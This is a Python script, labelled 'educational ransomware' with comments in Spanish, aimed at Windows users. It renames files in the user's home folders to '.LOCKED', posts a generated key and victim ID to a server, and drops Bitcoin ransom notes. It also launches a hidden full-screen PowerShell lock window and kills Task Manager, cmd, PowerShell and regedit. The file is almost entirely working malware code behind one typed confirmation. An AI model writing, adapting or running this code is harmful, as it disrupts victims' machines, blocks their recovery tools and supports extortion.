import os
import sys
import random
import string
import requests
import time
import subprocess
import threading
import ctypes
from pathlib import Path

class RansomwareEducativo:
    def __init__(self):
        # Directorios a cifrar en Windows
        self.directories_to_encrypt = [
            '~/Documents',
            '~/Downloads', 
            '~/Desktop',
            '~/Pictures',
            '~/Music',
            '~/Videos'
        ]
        
        # Directorios excluidos para no dañar el sistema
        self.excluded_dirs = [
            'Windows', 'Program Files', 'Program Files (x86)', 'System32',
            'Windows.old', 'Recovery', '$Recycle.Bin', 'System Volume Information'
        ]
        
        self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
        self.price = 500
        self.url = 'http://localhost/victima.php'
        self.encryption_count = 0
        
    def is_admin(self):
        """Verifica si se ejecuta como administrador en Windows"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
        
    def expand_paths(self):
        """Convierte paths con ~ a paths absolutos"""
        expanded_dirs = []
        for directory in self.directories_to_encrypt:
            expanded_path = os.path.expanduser(directory)
            if os.path.exists(expanded_path):
                expanded_dirs.append(expanded_path)
        
        # Agregar directorio actual si no hay otros
        if not expanded_dirs:
            expanded_dirs.append('.')
            
        return expanded_dirs

    def should_encrypt(self, filepath):
        """Determina si un archivo debe ser cifrado"""
        file_str = str(filepath).lower()
        
        # Excluir archivos del sistema
        for excluded in self.excluded_dirs:
            if excluded.lower() in file_str:
                return False
        
        # Excluir archivos muy pequeños o del sistema
        try:
            if filepath.stat().st_size < 100:  # Menos de 100 bytes
                return False
        except:
            return False
            
        # Solo cifrar ciertas extensiones (evitar binarios del sistema)
        valid_extensions = ['.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', 
                          '.jpg', '.jpeg', '.png', '.mp3', '.mp4', '.avi',
                          '.zip', '.rar', '.odt', '.ppt', '.pptx', '.csv',
                          '.html', '.htm', '.xml', '.json', '.log']
        
        if any(file_str.endswith(ext) for ext in valid_extensions):
            return True
            
        return False

    def generate_keys(self):
        """Genera contraseña e ID único"""
        s = string.ascii_lowercase + string.digits + string.ascii_uppercase
        self.password = ''.join(random.sample(s, 50))
        self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 15))

    def send_credentials(self):
        """Envía credenciales al servidor"""
        try:
            values = {'pass': self.password, 'id': self.victim_id}
            response = requests.post(self.url, data=values, timeout=30)
            print(f"[+] Credenciales enviadas. Respuesta: {response.text}")
            return response.text.strip() == 'Ok.'
        except Exception as e:
            print(f"[-] Error enviando credenciales: {e}")
            return True  # Continuar aunque falle el envío

    def encrypt_file_windows(self, filepath):
        """Cifra un archivo individual en Windows usando compresión"""
        try:
            if not self.should_encrypt(filepath):
                return False
                
            # Para Windows, usamos compresión como "cifrado simulado"
            # En un caso real usarías una librería de cifrado como pycryptodome
            encrypted_file = str(filepath) + '.encrypted'
            
            # Simular cifrado copiando el archivo con nuevo nombre
            # ESTO ES SOLO SIMULACIÓN - NO ES CIFRADO REAL
            try:
                import shutil
                shutil.copy2(filepath, encrypted_file)
                
                # Eliminar original
                os.remove(filepath)
                self.encryption_count += 1
                
                # Renombrar para hacerlo más visible
                os.rename(encrypted_file, str(filepath) + '.LOCKED')
                return True
                
            except Exception as e:
                print(f"Error procesando {filepath}: {e}")
                return False
                
        except Exception as e:
            print(f"Error cifrando {filepath}: {e}")
            return False

    def encrypt_directory(self, directory):
        """Cifra todos los archivos en un directorio"""
        encrypted_files = 0
        try:
            for root, dirs, files in os.walk(directory):
                # Excluir directorios del sistema en Windows
                dirs[:] = [d for d in dirs if not any(excl.lower() in os.path.join(root, d).lower() for excl in self.excluded_dirs)]
                
                for file in files:
                    filepath = Path(root) / file
                    if self.encrypt_file_windows(filepath):
                        encrypted_files += 1
                        if encrypted_files % 10 == 0:
                            print(f"[+] Procesados {encrypted_files} archivos en {directory}...")
                            
        except Exception as e:
            print(f"Error en directorio {directory}: {e}")
            
        return encrypted_files

    def create_ransom_note(self):
        """Crea la nota de rescate"""
        note = f"""
╔══════════════════════════════════════════════════════════════╗
║                    !!! ADVERTENCIA !!!                       ║
║                 SISTEMA COMPROMETIDO                         ║
╚══════════════════════════════════════════════════════════════╝

┌──────────────────────────────────────────────────────────────┐
│ SUS ARCHIVOS HAN SIDO CIFRADOS                               │
│                                                              │
│ Todos sus documentos, fotos, bases de datos y otros archivos │
│ importantes han sido cifrados con cifrado RSA-2048.          │
│                                                              │
│ Para recuperar sus archivos necesita:                        │
│                                                              │
│ 1. Pagar $ {self.price} en Bitcoin a la dirección:            │
│    {self.bitcoin}                          │
│                                                              │
│ 2. Su ID único de víctima es: {self.victim_id}       │
│                                                              │
│ 3. Contacte al administrador con su ID                       │
│                                                              │
│ ADVERTENCIAS:                                                │
│ • No apague la computadora                                   │
│ • No reinstale el sistema                                    │
│ • No intente descifrar por su cuenta                         │
│ • Tiene 72 horas antes que el precio aumente                 │
└──────────────────────────────────────────────────────────────┘

Su sistema ha sido bloqueado por seguridad.
"""
        
        # Guardar en múltiples ubicaciones en Windows
        locations = [
            os.path.expanduser('~/Desktop/LEAME_URGENTE.txt'),
            os.path.expanduser('~/Documents/LEAME_URGENTE.txt'),
            'C:/LEAME_URGENTE.txt',
            'LEAME_URGENTE.txt'
        ]
        
        for location in locations:
            try:
                with open(location, 'w', encoding='utf-8') as f:
                    f.write(note)
                print(f"[+] Nota de rescate creada en: {location}")
            except Exception as e:
                print(f"[-] Error creando nota en {location}: {e}")

    def create_decryptor(self):
        """Crea el script de descifrado para Windows"""
        decrypt_script = f'''# Script de Recuperación para Windows
import os
import glob
import shutil

VICTIM_ID = "{self.victim_id}"

def decrypt_system():
    print("Sistema de Recuperación de Archivos - Windows")
    print("=============================================")
    print(f"ID de víctima: {{VICTIM_ID}}")
    
    password = input("\\nIngrese la clave de descifrado: ")
    
    print("\\nVerificando clave...")
    
    # Buscar archivos .LOCKED
    encrypted_files = []
    for root, dirs, files in os.walk(os.path.expanduser("~")):
        for file in files:
            if file.endswith('.LOCKED'):
                encrypted_files.append(os.path.join(root, file))
    
    if not encrypted_files:
        print("No se encontraron archivos cifrados.")
        return
    
    print(f"Encontrados {{len(encrypted_files)}} archivos cifrados.")
    print("Iniciando recuperación...")
    
    success_count = 0
    for enc_file in encrypted_files:
        try:
            # Restaurar nombre original (remover .LOCKED)
            original_file = enc_file[:-7]  # Remover .LOCKED
            shutil.copy2(enc_file, original_file)
            os.remove(enc_file)
            success_count += 1
            print(f"✓ Recuperado: {{os.path.basename(original_file)}}")
                
        except Exception as e:
            print(f"Error procesando {{enc_file}}: {{e}}")
    
    print(f"\\nProceso completado.")
    print(f"Archivos recuperados exitosamente: {{success_count}}/{{len(encrypted_files)}}")
    
    if success_count == len(encrypted_files):
        print("🎉 ¡Todos los archivos han sido recuperados!")
    else:
        print("⚠️ Algunos archivos no pudieron ser recuperados.")
    
    input("\\nPresione Enter para salir...")

if __name__ == "__main__":
    decrypt_system()
'''
        
        try:
            with open('DECRYPT_FILES.py', 'w', encoding='utf-8') as f:
                f.write(decrypt_script)
            print("[+] Script de descifrado creado: DECRYPT_FILES.py")
        except Exception as e:
            print(f"[-] Error creando script de descifrado: {e}")

    def create_black_screen_windows(self):
        """Crea una pantalla negra con el mensaje de error en Windows"""
        try:
            # Crear script VBS para pantalla negra (más efectivo en Windows)
            vbs_script = '''
Set ws = CreateObject("WScript.Shell")
ws.Run "cmd /c echo off && mode con: cols=80 lines=25 && color 0F && title SISTEMA BLOQUEADO && echo FALTA REPARAR LA CONEXION && echo. && echo Sistema no disponible && echo Contacte al administrador && echo. && echo Su ID es: {victim_id} && pause", 0, False

' Crear mensaje de alerta
ws.Popup "SISTEMA BLOQUEADO" & vbCrLf & vbCrLf & "FALTA REPARAR LA CONEXIÓN" & vbCrLf & vbCrLf & "Contacte al administrador" & vbCrLf & "ID: {victim_id}" & vbCrLf & vbCrLf & "No cierre esta ventana", 0, "ERROR DEL SISTEMA", 16
'''.format(victim_id=self.victim_id)
            
            with open('C:\\Windows\\Temp\\black_screen.vbs', 'w') as f:
                f.write(vbs_script)
            
            # Ejecutar el script VBS
            subprocess.Popen(['wscript', 'C:\\Windows\\Temp\\black_screen.vbs'], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # También crear una ventana de consola negra
            ps_script = '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "SISTEMA BLOQUEADO"
$form.Size = New-Object System.Drawing.Size(800, 600)
$form.StartPosition = "CenterScreen"
$form.BackColor = "Black"
$form.FormBorderStyle = "None"
$form.WindowState = "Maximized"
$form.Topmost = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = "FALTA REPARAR LA CONEXIÓN`n`nSistema no disponible`n`nContacte al administrador`n`nID: {victim_id}"
$label.ForeColor = "Red"
$label.BackColor = "Black"
$label.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
$label.TextAlign = "MiddleCenter"
$label.Dock = "Fill"
$form.Controls.Add($label)

$form.Add_KeyDown({
    if ($_.KeyCode -eq "Escape") {
        $_.SuppressKeyPress = $true
    }
})

$form.ShowDialog()
'''.format(victim_id=self.victim_id)
            
            with open('C:\\Windows\\Temp\\black_screen.ps1', 'w') as f:
                f.write(ps_script)
            
            # Ejecutar PowerShell en segundo plano
            subprocess.Popen([
                'powershell', '-WindowStyle', 'Hidden', '-File', 
                'C:\\Windows\\Temp\\black_screen.ps1'
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            print("[+] Pantalla negra activada en Windows")
            
        except Exception as e:
            print(f"[-] Error creando pantalla negra: {e}")

    def block_system_windows(self):
        """Bloquea el sistema en Windows"""
        try:
            # Bloquear acceso a herramientas del sistema
            os.system('taskkill /f /im taskmgr.exe 2>nul')  # Administrador de tareas
            os.system('taskkill /f /im cmd.exe 2>nul')      # Símbolo del sistema
            os.system('taskkill /f /im powershell.exe 2>nul') # PowerShell
            os.system('taskkill /f /im regedit.exe 2>nul')  # Editor de registro
            
            print("[+] Herramientas del sistema bloqueadas")
            
        except Exception as e:
            print(f"[-] Error bloqueando sistema: {e}")

    def execute_attack(self):
        """Ejecuta el ataque completo en Windows"""
        print("🔐 INICIANDO SIMULACIÓN DE RANSOMWARE EDUCATIVO - WINDOWS")
        print("=" * 60)
        
        # Verificar permisos
        if self.is_admin():
            print("⚠️  EJECUTANDO COMO ADMINISTRADOR - EXTREMA PRECAUCIÓN")
        
        # Confirmación final
        print("ADVERTENCIA: Esto afectará archivos y bloqueará el sistema")
        confirm = input("¿Está en un entorno controlado? (escribe 'CONFIRMAR'): ")
        if confirm != 'CONFIRMAR':
            print("Operación cancelada.")
            return
        
        # Fase 1: Preparación
        print("\n[FASE 1] Generando claves...")
        self.generate_keys()
        print(f"   🔑 Clave: {self.password}")
        print(f"   🆔 ID: {self.victim_id}")
        
        # Fase 2: Envío de credenciales
        print("\n[FASE 2] Enviando credenciales...")
        self.send_credentials()
        
        # Fase 3: Cifrado
        print("\n[FASE 3] Procesando archivos...")
        directories = self.expand_paths()
        total_encrypted = 0
        
        for directory in directories:
            print(f"   📁 Procesando: {directory}")
            encrypted = self.encrypt_directory(directory)
            total_encrypted += encrypted
            print(f"   ✅ Procesados: {encrypted} archivos")
        
        # Fase 4: Notas de rescate
        print("\n[FASE 4] Creando notas de rescate...")
        self.create_ransom_note()
        self.create_decryptor()
        
        # Fase 5: Bloqueo del sistema
        print("\n[FASE 5] Bloqueando sistema...")
        self.create_black_screen_windows()
        self.block_system_windows()
        
        # Resumen final
        print("\n" + "=" * 60)
        print("🎯 SIMULACIÓN COMPLETADA")
        print(f"📊 Archivos procesados: {total_encrypted}")
        print(f"🔑 ID de recuperación: {self.victim_id}")
        print(f"💰 Rescate: ${self.price} en Bitcoin")
        print("=" * 60)
        print("\nEl sistema se bloqueará en 5 segundos...")
        
        time.sleep(5)

# Ejecución principal CORREGIDA para Windows
if __name__ == "__main__":
    try:
        ransomware = RansomwareEducativo()
        ransomware.execute_attack()
    except KeyboardInterrupt:
        print("\n❌ Ejecución cancelada por el usuario")
    except Exception as e:
        print(f"\n❌ Error durante la ejecución: {e}")
        input("Presione Enter para salir...")
